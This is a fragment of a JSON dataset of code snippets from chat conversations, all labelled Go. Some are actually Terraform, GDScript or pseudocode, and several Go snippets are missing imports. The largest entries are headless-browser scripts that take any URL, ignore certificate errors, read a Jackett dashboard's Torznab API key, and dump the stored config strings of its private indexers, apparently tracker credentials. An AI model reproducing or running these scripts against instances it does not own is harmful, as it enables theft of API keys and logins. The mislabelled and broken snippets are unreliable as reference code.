    "code": "# تعریف ماشین مجازی اول\nresource \"vsphere_virtual_machine\" \"vm1\" {\n  name             = \"vm1\"\n  vcpu             = 2\n  memory           = 4096\n  datacenter       = \"my-datacenter\"\n  datastore        = \"my-datastore\"\n  cluster          = \"my-cluster\"\n  network_interface {\n    label          = \"Network 1\"\n    network        = \"network-1\"\n  }\n}\n\n# تعریف ماشین مجازی دوم\nresource \"vsphere_virtual_machine\" \"vm2\" {\n  name             = \"vm2\"\n  vcpu             = 4\n  memory           = 8192\n  datacenter       = \"my-datacenter\"\n  datastore        = \"my-datastore\"\n  cluster          = \"my-cluster\"\n  network_interface {\n    label          = \"Network 2\"\n    network        = \"network-2\"\n  }\n}\n\n# تعریف شبکه برای ماشین مجازی اول\nresource \"vsphere_network\" \"network1\" {\n  name             = \"network-1\"\n  vlan_id          = 10\n  datacenter       = \"my-datacenter\"\n}\n\n# تعریف شبکه برای ماشین مجازی دوم\nresource \"vsphere_network\" \"network2\" {\n  name             = \"network-2\"\n  vlan_id          = 20\n  datacenter       = \"my-datacenter\"\n}",
    "filename": "95dae82323e032a5aa830f34f70fdf1d_0.go"
  },
  {
    "conversation_hash": "98c11e0798bf2a57f18bd14d779e7973",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "extends KinematicBody2D\n\nexport var suspensionHeight = 1.0\nexport var suspensionStiffness = 20.0\nexport var suspensionDamping = 4.0\nexport var suspensionRestLength = 1.0\nexport var maxSuspensionForce = 10000.0\nexport var wheelRadius = 0.2\nexport var wheelFriction = 10.0\n\nvar raycastLength = suspensionHeight + wheelRadius\nvar suspensionStart = Vector2(0, 0.5)\nvar suspensionEnd = Vector2(0, -0.5)\nvar suspensionForce = 0.0\n\nfunc _ready():\n\tset_fixed_process(true)\n\nfunc _fixed_process(delta):\n\tvar suspensionForce = 0.0\n\t\n\tvar suspensionRayStart = global_transform.origin + suspensionStart\n\tvar suspensionRayEnd = global_transform.origin + suspensionEnd\n\t\n\tvar result = get_world_2d().direct_space_state.intersect_ray(suspensionRayStart, suspensionRayEnd)\n\t\n\tif result:\n\t\tvar suspensionLength = result.position.distance_to(suspensionRayStart) - wheelRadius\n\t\tvar suspensionVelocity = result.collider.linear_velocity.dot(result.normal)\n\t\t\n\t\tsuspensionForce = (suspensionLength - suspensionRestLength) * suspensionStiffness - suspensionVelocity * suspensionDamping\n\t\tsuspensionForce = clamp(suspensionForce, -maxSuspensionForce, maxSuspensionForce)\n\t\t\n\t\tvar wheelDirection = Vector2(-result.normal.y, result.normal.x)\n\t\tvar wheelContactPoint = result.position - result.normal * wheelRadius\n\t\tvar wheelForwardVelocity = wheelDirection.dot(result.collider.linear_velocity)\n\t\tvar wheelSidewaysVelocity = -wheelDirection.cross(result.collider.linear_velocity)\n\t\t\n\t\tvar wheelForwardForce = -wheelForwardVelocity * wheelFriction\n\t\tvar wheelSidewaysForce = -wheelSidewaysVelocity * wheelFriction\n\t\t\n\t\tresult.collider.apply_impulse(wheelContactPoint, wheelDirection * (suspensionForce + wheelForwardForce))\n\t\tresult.collider.apply_impulse_offset(wheelContactPoint, -wheelDirection * wheelSidewaysForce)\n\t\n\t# Вызываем движение автомобиля с учетом силы подвески\n\tmove_and_slide(Vector2(), Vector2(0, -1))",
    "filename": "98c11e0798bf2a57f18bd14d779e7973_1.go"
  },
  {
    "conversation_hash": "98c11e0798bf2a57f18bd14d779e7973",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "extends KinematicBody\n\nexport var suspensionHeight = 1.0\nexport var suspensionStiffness = 20.0\nexport var suspensionDamping = 4.0\nexport var suspensionRestLength = 1.0\nexport var maxSuspensionForce = 10000.0\nexport var wheelRadius = 0.2\nexport var wheelFriction = 10.0\n\nvar raycastLength = suspensionHeight + wheelRadius\nvar suspensionStart = Vector3(0, 0.5, 0)\nvar suspensionEnd = Vector3(0, -0.5, 0)\nvar suspensionForce = 0.0\n\nfunc _ready():\n\tset_fixed_process(true)\n\nfunc _fixed_process(delta):\n\tvar suspensionForce = 0.0\n\t\n\tvar suspensionRayStart = global_transform.origin + suspensionStart\n\tvar suspensionRayEnd = global_transform.origin + suspensionEnd\n\t\n\tvar result = get_world().direct_space_state.intersect_ray(suspensionRayStart, suspensionRayEnd)\n\t\n\tif result:\n\t\tvar suspensionLength = result.position.distance_to(suspensionRayStart) - wheelRadius\n\t\tvar suspensionVelocity = result.collider.linear_velocity.dot(result.normal)\n\t\t\n\t\tsuspensionForce = (suspensionLength - suspensionRestLength) * suspensionStiffness - suspensionVelocity * suspensionDamping\n\t\tsuspensionForce = clamp(suspensionForce, -maxSuspensionForce, maxSuspensionForce)\n\t\t\n\t\tvar wheelDirection = -result.normal\n\t\tvar wheelContactPoint = result.position - result.normal * wheelRadius\n\t\tvar wheelForwardVelocity = wheelDirection.dot(result.collider.linear_velocity)\n\t\tvar wheelSidewaysVelocity = -wheelDirection.cross(result.collider.linear_velocity)\n\t\t\n\t\tvar wheelForwardForce = -wheelForwardVelocity * wheelFriction\n\t\tvar wheelSidewaysForce = -wheelSidewaysVelocity * wheelFriction\n\t\t\n\t\tresult.collider.add_central_force(wheelDirection * (suspensionForce + wheelForwardForce))\n\t\tresult.collider.add_force(wheelContactPoint, -wheelDirection * wheelSidewaysForce)\n\t\n\t# Вызываем движение автомобиля с учетом силы подвески\n\tmove_and_slide(Vector3(), Vector3(0, -1, 0))",
    "filename": "98c11e0798bf2a57f18bd14d779e7973_6.go"
  },
  {
    "conversation_hash": "1ea2179f8c2737dac828d8226ce6a502",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n\tif len(os.Args) < 2 {\n\t\tfmt.Println(\"Usage: go run main.go <url>\")\n\t\treturn\n\t}\n\n\turl := os.Args[1]\n\tif err := inspectIndexers(url); err != nil {\n\t\tlog.Fatal(\"Error:\", err)\n\t}\n}\n\nfunc inspectIndexers(url string) error {\n\toptions := []chromedp.ExecAllocatorOption{\n\t\tchromedp.ExecPath(\"/path/to/your/chromium-or-chrome-binary\"),\n\t\tchromedp.NoSandbox,\n\t\tchromedp.Headless,\n\t\tchromedp.DisableGPU,\n\t\tchromedp.Flag(\"ignore-certificate-errors\", true),\n\t}\n\n\tctx, cancel := chromedp.NewExecAllocator(context.Background(), options...)\n\tdefer cancel()\n\n\tctx, cancel = chromedp.NewContext(ctx)\n\tdefer cancel()\n\n\tctx, cancel = context.WithTimeout(ctx, 5*time.Minute)\n\tdefer cancel()\n\n\tvar apiKey string\n\terr := chromedp.Run(ctx,\n\t\tchromedp.Navigate(url),\n\t\tchromedp.WaitVisible(`b.api-key-text`),\n\t\tchromedp.Text(`b.api-key-text`, &apiKey),\n\t)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error getting API key: %v\", err)\n\t}\n\n\tcurrentURL := \"\"\n\tif err := chromedp.Run(ctx, chromedp.Location(&currentURL)); err != nil {\n\t\treturn fmt.Errorf(\"error getting current URL: %v\", err)\n\t}\n\n\tnewURL := strings.Replace(currentURL, \"UI/Dashboard\", \"api/v2.0/indexers?configured=true\", 1)\n\n\tvar responseHTML string\n\tif err := chromedp.Run(ctx,\n\t\tchromedp.Navigate(newURL),\n\t\tchromedp.WaitVisible(\"body\"),\n\t\tchromedp.InnerHTML(\"body\", &responseHTML),\n\t); err != nil {\n\t\treturn fmt.Errorf(\"error getting response body: %v\", err)\n\t}\n\n\tvar response []map[string]interface{}\n\tif err := json.Unmarshal([]byte(responseHTML), &response); err != nil {\n\t\treturn fmt.Errorf(\"error unmarshalling JSON response: %v\", err)\n\t}\n\n\tprivateItems := make([]map[string]interface{}, 0)\n\tfor _, item := range response {\n\t\titemType := strings.ToLower(fmt.Sprintf(\"%v\", item[\"type\"]))\n\t\tconfigured := strings.ToLower(fmt.Sprintf(\"%v\", item[\"configured\"]))\n\n\t\tif strings.Contains(itemType, \"private\") && configured == \"true\" {\n\t\t\tprivateItems = append(privateItems, item)\n\t\t}\n\t}\n\n\tif len(privateItems) == 0 {\n\t\treturn nil\n\t}\n\n\tfmt.Printf(\"\\nTorznab key: %s\\n\", apiKey)\n\n\tfor _, item := range privateItems {\n\t\tid := fmt.Sprintf(\"%v\", item[\"id\"])\n\t\tconfigURL := strings.Replace(currentURL, \"UI/Dashboard\", fmt.Sprintf(\"api/v2.0/indexers/%s/config\", id), 1)\n\n\t\tconfigResponse, err := getConfigResponseWithCookies(configURL, ctx)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"Error getting config for %s: %v\\n\", id, err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfilteredElements := make([]string, 0)\n\t\tfor _, element := range configResponse {\n\t\t\telementType := fmt.Sprintf(\"%v\", element[\"type\"])\n\t\t\telementValue := fmt.Sprintf(\"%v\", element[\"value\"])\n\n\t\t\tif elementType == \"inputstring\" && elementValue != \"true\" && elementValue != \"false\" {\n\t\t\t\tfilteredElements = append(filteredElements, elementValue)\n\t\t\t}\n\t\t}\n\n\t\tgroupedValues := strings.Join(filteredElements, \" | \")\n\t\tfmt.Printf(\"%s | %s\\n\", id, groupedValues)\n\t}\n\n\treturn nil\n}\n\nfunc getConfigResponseWithCookies(url string, ctx context.Context) ([]map[string]interface{}, error) {\n\tcookies, err := chromedp.Cookies(ctx)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error getting cookies: %v\", err)\n\t}\n\n\tclient := &http.Client{}\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error creating request: %v\", err)\n\t}\n\n\tfor _, cookie := range cookies {\n\t\treq.AddCookie(&http.Cookie{\n\t\t\tName:  cookie.Name,\n\t\t\tValue: cookie.Value,\n\t\t})\n\t}\n\n\treqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)\n\tdefer cancel()\n\treq = req.WithContext(reqCtx)\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error sending request: %v\", err)\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := io.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"error reading response body: %v\", err)\n\t}\n\n\tvar response []map[string]interface{}\n\tif err := json.Unmarshal(body, &response); err != nil {\n\t\treturn nil, fmt.Errorf(\"error unmarshalling JSON response: %v\", err)\n\t}\n\n\treturn response, nil\n}",
    "filename": "1ea2179f8c2737dac828d8226ce6a502_2.go"
  },
  {
    "conversation_hash": "beac14ef1632970e56ccd075030201b8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/go-rod/rod\"\n\t\"github.com/go-rod/rod/lib/launcher\"\n)\n\nfunc main() {\n\tpageURL := os.Args[1]\n\terr := playVideo(pageURL)\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\tos.Exit(1)\n\t}\n\tos.Exit(0)\n}\n\nfunc playVideo(pageURL string) error {\n\tpath, err := launcher.LookPath()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tl := launcher.New().\n\t\tSet(\"no-sandbox\", \"true\").\n\t\tSet(\"disable-gpu\", \"true\").\n\t\tSet(\"ignore-certificate-errors\", \"true\").\n\t\tBin(path).\n\t\tHeadless(true)\n\tdefer l.Cleanup()\n\n\turlLauncher, err := l.Launch()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tbrowser := rod.New().ControlURL(urlLauncher)\n\terr = browser.Connect()\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer browser.Close()\n\n\tpage := browser.MustPage(pageURL).MustWaitLoad()\n\tfirstResult, err := page.Sleeper(rod.DefaultSleeper).Element(\"b.api-key-text\").Text()\n\tif err != nil {\n\t\tfirstResult = \"Null\"\n\t}\n\n\tcurrentURL := page.MustInfo().URL\n\tnewURL := strings.Replace(currentURL, \"UI/Dashboard\", \"api/v2.0/indexers?configured=true\", 1)\n\tpage = browser.MustPage(newURL).MustWaitLoad()\n\n\tcookies := page.MustCookies()\n\n\tbody := page.MustEval(`document.body.innerText`).String()\n\tvar response []map[string]interface{}\n\tjson.Unmarshal([]byte(body), &response)\n\n\tvar privateItems []map[string]interface{}\n\tfor _, item := range response {\n\t\titemType, ok := item[\"type\"].(string)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\t\titemConfigured, ok := item[\"configured\"].(bool)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\t\tif strings.Contains(strings.ToLower(itemType), \"private\") && itemConfigured {\n\t\t\tprivateItems = append(privateItems, item)\n\t\t}\n\t}\n\n\tif len(privateItems) > 0 {\n\t\tfmt.Printf(\"\\nTorznab key: %s\\n\", firstResult)\n\t} else {\n\t\treturn nil\n\t}\n\n\tvar finalResult []map[string]string\n\tfor _, item := range privateItems {\n\t\tid, ok := item[\"id\"].(string)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\t\tconfigURL := strings.Replace(currentURL, \"UI/Dashboard\", fmt.Sprintf(\"api/v2.0/indexers/%s/config\", id), 1)\n\t\tfinalResult = append(finalResult, map[string]string{\"id\": id, \"config_url\": configURL})\n\t}\n\n\tclient := &http.Client{\n\t\tTimeout: 10 * time.Second,\n\t}\n\n\tfor _, item := range finalResult {\n\t\tconfigResponse, err := getConfigResponseWithCookies(client, item[\"config_url\"], cookies)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"##%s | %s | %s\\n\", item[\"id\"], item[\"config_url\"], err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfilteredElements := make([]interface{}, 0)\n\t\tfor _, element := range configResponse {\n\t\t\telementType, ok := element[\"type\"].(string)\n\t\t\tif !ok || elementType != \"inputstring\" {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tvalue, ok := element[\"value\"].(string)\n\t\t\tif ok && value != \"\" {\n\t\t\t\tfilteredElements = append(filteredElements, value)\n\t\t\t}\n\t\t}\n\n\t\tvar groupedValues string\n\t\tfor _, value := range filteredElements {\n\t\t\tgroupedValues += value.(string) + \" | \"\n\t\t}\n\n\t\tprefixedGroupedValues := item[\"id\"] + \" | \" + strings.TrimSuffix(groupedValues, \" | \")\n\t\tfmt.Println(prefixedGroupedValues)\n\t}\n\treturn nil\n}\n\nfunc getConfigResponseWithCookies(client *http.Client, configURL string, cookies []*rod.Cookie) ([]map[string]interface{}, error) {\n\treq, err := http.NewRequest(\"GET\", configURL, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar cookieStr string\n\tfor _, cookie := range cookies {\n\t\tcookieStr += cookie.Name + \"=\" + cookie.Value + \"; \"\n\t}\n\treq.Header.Set(\"Cookie\", strings.TrimSuffix(cookieStr, \"; \"))\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar response []map[string]interface{}\n\terr = json.Unmarshal(body, &response)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn response, nil\n}",
    "filename": "beac14ef1632970e56ccd075030201b8_0.go"
  },
  {
    "conversation_hash": "91345a88bc0f5822e10bc22ab49b7b89",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/go-rod/rod\"\n\t\"github.com/go-rod/rod/lib/proto\"\n)\n\nfunc main() {\n\tif len(os.Args) < 2 {\n\t\tfmt.Println(\"Usage: go run script.go <url>\")\n\t\tos.Exit(1)\n\t}\n\n\turl := os.Args[1]\n\tif err := playVideo(url); err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n}\n\nfunc playVideo(url string) error {\n\tpage := rod.New().MustConnect().MustIgnoreCertErrors(true).MustPage(url)\n\tdefer page.MustClose()\n\n\t// Get firstResult before loading newUrl\n\tvar firstResult string\n\tpage.MustWaitLoad().MustWaitIdle()\n\tfirstElement, err := page.Element(\"b.api-key-text\")\n\tif err == nil {\n\t\tfirstResult, _ = firstElement.Text()\n\t}\n\t// Replace 'UI/Dashboard' with 'api/v2.0/indexers?configured=true' in the URL\n\treplacementURL := strings.Replace(page.MustInfo().URL, \"UI/Dashboard\", \"api/v2.0/indexers?configured=true\", 1)\n\tpage.MustNavigate(replacementURL)\n\n\tcookies := page.MustCookies()\n\n\tvar response []struct {\n\t\tType       string\n\t\tConfigured bool\n\t\tID         string\n\t}\n\n\tpage.MustWaitLoad().MustWaitIdle()\n\tpage.MustEval(`document.body.innerText`, &response)\n\n\t// Filter for private and configured items\n\tvar privateItems []struct {\n\t\tID  string\n\t\tURL string\n\t}\n\tfor _, item := range response {\n\t\tif strings.Contains(strings.ToLower(item.Type), \"private\") && item.Configured {\n\t\t\tconfigURL := strings.Replace(page.MustInfo().URL, \"UI/Dashboard\", fmt.Sprintf(\"api/v2.0/indexers/%s/config\", item.ID), 1)\n\t\t\tprivateItems = append(privateItems, struct {\n\t\t\t\tID  string\n\t\t\t\tURL string\n\t\t\t}{ID: item.ID, URL: configURL})\n\t\t}\n\t}\n\n\tif len(privateItems) == 0 {\n\t\treturn nil\n\t}\n\n\tfmt.Printf(\"\\nTorznab key: %s\\n\\n\", firstResult)\n\t// Process each config_url ...\n\t// (Due to the complexity and specific HTTP request handling with cookies, this part is omitted.)\n\t// You should use a Go HTTP client to make requests with cookies and manipulate the timeout as needed.\n\n\treturn nil\n}",
    "filename": "91345a88bc0f5822e10bc22ab49b7b89_1.go"
  },
  {
    "conversation_hash": "3e4d454458c0044e6140cfb8c386caf5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/go-rod/rod\"\n\t\"github.com/go-rod/rod/lib/launcher\"\n)\n\nfunc main() {\n\tif len(os.Args) < 2 {\n\t\tlog.Fatal(\"Usage: go run <script.go> <url>\")\n\t}\n\turlArg := os.Args[1]\n\tif err := playVideo(urlArg); err != nil {\n\t\tlog.Fatal(\"Error:\", err)\n\t}\n}\n\nfunc playVideo(urlArg string) error {\n\t// Set up a new browser with options similar to Puppeteer's\n\tpath, err := launcher.LookPath()\n\tif err != nil {\n\t\treturn err\n\t}\n\tbrowser := rod.New().ControlURL(launcher.New().Bin(path).Headless(true).MustLaunch()).MustConnect()\n\n\tdefer browser.MustClose()\n\n\t// Navigate to the URL\n\tpage := browser.MustPage(urlArg)\n\tpage.Timeout(60 * time.Second).MustWaitLoad()\n\n\t// Step 1: Get the firstResult before loading newUrl\n\tfirstResult, err := page.MustElement(\"b.api-key-text\").Text()\n\tif err != nil {\n\t\tfirstResult = \"Null\"\n\t}\n\n\t// Step 2: Get the current page URL (similar procedure)\n\tcurrentURL := page.MustInfo().URL\n\n\t// Step 3: Create a new URL by replacing 'UI/Dashboard' with 'api/v2.0/indexers?configured=true'\n\tnewURL := strings.Replace(currentURL, \"UI/Dashboard\", \"api/v2.0/indexers?configured=true\", 1)\n\n\t// Step 4: Load the new URL and parse its JSON response\n\tpage.MustNavigate(newURL)\n\tjsonStr := page.MustElement(\"body\").MustText()\n\tvar response []map[string]interface{}\n\tif err := json.Unmarshal([]byte(jsonStr), &response); err != nil {\n\t\treturn err\n\t}\n\n\t// Step 5 and Step 6: Filter to keep only certain elements\n\tvar privateItems []map[string]interface{}\n\tfor _, item := range response {\n\t\titemType, okType := item[\"type\"].(string)\n\t\t// The rest of the filtering logic goes here...\n\t\t// You can filter based on itemType and other fields needed.\n\t}\n\n\t// Further steps would involve iterating through privateItems and fetching/configuring\n\t// new URLs as done in the original script. Configure a custom HTTP client with cookie\n\t// support as needed for requests.\n\n\t// The rest of the implementation is left as an exercise, as it largely depends on the\n\t// structures of your JSON data and specific task requirements.\n\n\treturn nil\n}",
    "filename": "3e4d454458c0044e6140cfb8c386caf5_0.go"
  },
  {
    "conversation_hash": "68a545f14d10e22a2e873f2da73ef4e7",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/go-rod/rod\"\n\t\"github.com/go-rod/rod/lib/proto\"\n)\n\nfunc main() {\n\t// You will need to pass the URL for example via command line or hard code it\n\t// for simplicity, here I'm hardcoding:\n\turlStr := \"https://example.com\"\n\n\tif err := playVideo(urlStr); err != nil {\n\t\tlog.Fatalf(\"Error: %v\", err)\n\t}\n}\n\nfunc playVideo(urlStr string) error {\n\tbrowser := rod.New().MustConnect().NoDefaultDevice()\n\n\tpage := browser.MustPage()\n\tdefer browser.MustClose()\n\n\t// Navigate to the initial URL\n\terr := page.Navigate(urlStr)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Wait for network idle\n\terr = page.WaitLoad()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Step 1: Retrieve firstResult from the page\n\tvar firstResult string\n\tfirstElement := page.MustElement(\"b.api-key-text\")\n\tif firstElement != nil {\n\t\tfirstResult, err = firstElement.Text()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\t// Step 3: Replace part of the URL to construct the new URL\n\tnewUrlStr := strings.Replace(page.MustInfo().URL, \"UI/Dashboard\", \"api/v2.0/indexers?configured=true\", 1)\n\n\t// Navigate to the new URL\n\terr = page.Navigate(newUrlStr)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Wait for network idle\n\terr = page.WaitLoad()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Retrieve and parse the JSON response\n\tbody, err := page.MustElement(\"body\").Text()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tvar response []struct {\n\t\tId         string `json:\"id\"`\n\t\tType       string `json:\"type\"`\n\t\tConfigured bool   `json:\"configured\"`\n\t}\n\n\terr = json.Unmarshal([]byte(body), &response)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Filter the items based on type and configured\n\tvar privateItems []struct {\n\t\tId  string\n\t\tURL string\n\t}\n\n\tfor _, item := range response {\n\t\tif strings.Contains(strings.ToLower(item.Type), \"private\") && item.Configured {\n\t\t\tnewUrl, err := url.Parse(page.MustInfo().URL)\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\tnewUrl.Path = strings.Replace(newUrl.Path, \"UI/Dashboard\", fmt.Sprintf(\"api/v2.0/indexers/%s/config\", item.Id), 1)\n\t\t\tprivateItems = append(privateItems, struct {\n\t\t\t\tId  string\n\t\t\t\tURL string\n\t\t\t}{Id: item.Id, URL: newUrl.String()})\n\t\t}\n\t}\n\n\tif len(privateItems) == 0 {\n\t\treturn nil // No private items found\n\t}\n\n\tfmt.Printf(\"\\nTorznab key: %s\\n\", firstResult) // Print the Torznab key\n\n\t// Step 8: Process each config_url\n\tfor _, item := range privateItems {\n\t\ttimeout := 10 * time.Second // Initial timeout is 10 seconds\n\t\terr = processConfigURL(page, item.URL, timeout)\n\n\t\t// Step 10: Retry error config_urls with increasing timeout\n\t\tfor retryTimeout := 2 * timeout; err != nil && retryTimeout <= 30*time.Second; retryTimeout *= 2 {\n\t\t\ttime.Sleep(retryTimeout) // Wait before retrying\n\n\t\t\terr = processConfigURL(page, item.URL, retryTimeout)\n\t\t}\n\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"##Retry Failed | %s | %s\\n\", item.URL, err.Error()) // Print errored URLs\n\t\t}\n\t}\n\n\treturn nil\n}\n\nfunc processConfigURL(page *rod.Page, configURL string, timeout time.Duration) error {\n\t// Make an HTTP request with the cookies from the browser\n\tcookies := page.MustCookies()\n\tcookieHeader := \"\"\n\tfor _, c := range cookies {\n\t\tcookieHeader += fmt.Sprintf(\"%s=%s; \", c.Name, c.Value)\n\t}\n\n\tclient := &http.Client{Timeout: timeout}\n\treq, err := http.NewRequest(\"GET\", configURL, nil)\n\tif err != nil {\n\t\treturn err\n\t}\n\treq.Header.Add(\"Cookie\", cookieHeader)\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\tvar configResponse []proto.NetworkRequestWillBeSentExtraInfoParamCookies\n\terr = json.NewDecoder(resp.Body).Decode(&configResponse)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Process response similar to Step 9\n\t// ...\n\n\treturn nil\n}",
    "filename": "68a545f14d10e22a2e873f2da73ef4e7_0.go"
  },
  {
    "conversation_hash": "2edd1224b4447db1c9ecc7c243c46198",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\ntype UserCreateRequest struct {\n\tFirstName string\n\tAge       int\n}\n\nfunc Validate(req UserCreateRequest) string {\n\tif req.FirstName == \"\" || strings.Contains(req.FirstName, \" \") {\n\t\treturn \"invalid request\"\n\t}\n\tif req.Age <= 0 || req.Age > 150 {\n\t\treturn \"invalid request\"\n\t}\n\treturn \"\"\n}\n\nfunc main() {\n\treq1 := UserCreateRequest{\"John Doe\", 25}\n\treq2 := UserCreateRequest{\"Jane\", 0}\n\n\tfmt.Println(Validate(req1)) // Output: invalid request\n\tfmt.Println(Validate(req2)) // Output: invalid request\n}",
    "filename": "2edd1224b4447db1c9ecc7c243c46198_0.go"
  },
  {
    "conversation_hash": "ce925f44ddf9cd707b2a0d74d97132a7",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n\n\ttgbotapi \"gopkg.in/telegram-bot-api.v4\"\n)\n\nfunc main() {\n\tbotToken := os.Getenv(\"TELEGRAM_BOT_TOKEN\") // Получаем токен вашего Telegram бота\n\n\tbot, err := tgbotapi.NewBotAPI(botToken)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to create bot: %v\", err)\n\t}\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates, err := bot.GetUpdatesChan(u)\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to get updates channel: %v\", err)\n\t}\n\n\tfor update := range updates {\n\t\tif update.Message == nil { // игнорируем все сообщения кроме текста сообщений от пользователей\n\t\t\tcontinue\n\t\t}\n\n\t\tif strings.HasPrefix(update.Message.Text, \"/start\") { // отвечаем на команду /start\n\t\t\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, \"Привет! Я бот и буду отвечать на твои сообщения.\")\n\t\t\tbot.Send(msg)\n\t\t} else { // отвечаем на все остальные сообщения\n\t\t\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, generateResponse())\n\t\t\tbot.Send(msg)\n\t\t}\n\t}\n}\n\nfunc generateResponse() string {\n\t// Вернуть случайный ответ, чтобы сделать бота немного более интересным\n\tresponses := []string{\n\t\t\"Я не знаю, о чем ты говоришь.\",\n\t\t\"Приятно познакомиться!\",\n\t\t\"Какой интересный вопрос!\",\n\t\t\"Что думаешь о погоде?\",\n\t\t\"Мы можем поговорить о чем-то другом, если хочешь.\",\n\t}\n\n\t// Имитируем некоторую задержку\n\ttime.Sleep(1 * time.Second)\n\n\t// Возвращаем случайный ответ из списка\n\treturn responses[time.Now().Unix()%int64(len(responses))]\n}",
    "filename": "ce925f44ddf9cd707b2a0d74d97132a7_0.go"
  },
  {
    "conversation_hash": "0061d12014bfb59b15d4491f27de7662",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "v"
    ],
    "code": "procedure BFS(G, root) is\n    let Q be a queue\n    label root as explored\n    Q.enqueue(root)\n    while Q is not empty do\n        v := Q.dequeue()\n        if v is the goal then\n            return true\n        for all edges from v to w in G.adjacentEdges(v) do\n            if w is not labeled as explored then\n                label w as explored\n                Q.enqueue(w)\n    return false",
    "filename": "0061d12014bfb59b15d4491f27de7662_0.go"
  },
  {
    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"sync\"\n)\n\ntype SafeStorage[T any] struct {\n\tstorage map[string]T\n\tmutex   sync.Mutex\n}\n\nfunc NewSafeStorage[T any]() *SafeStorage[T] {\n\treturn &SafeStorage[T]{\n\t\tstorage: make(map[string]T),\n\t}\n}\n\nfunc (s *SafeStorage[T]) Set(key string, value T) {\n\ts.mutex.Lock()\n\tdefer s.mutex.Unlock()\n\n\ts.storage[key] = value\n}\n\nfunc (s *SafeStorage[T]) Get(key string) (T, bool) {\n\ts.mutex.Lock()\n\tdefer s.mutex.Unlock()\n\n\tvalue, ok := s.storage[key]\n\treturn value, ok\n}\n\nfunc main() {\n\tstorage := NewSafeStorage[int]()\n\t\n\tstorage.Set(\"key1\", 42)\n\t\n\tif value, ok := storage.Get(\"key1\"); ok {\n\t\tfmt.Println(value) // Output: 42\n\t}\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_0.go"
  },
  {
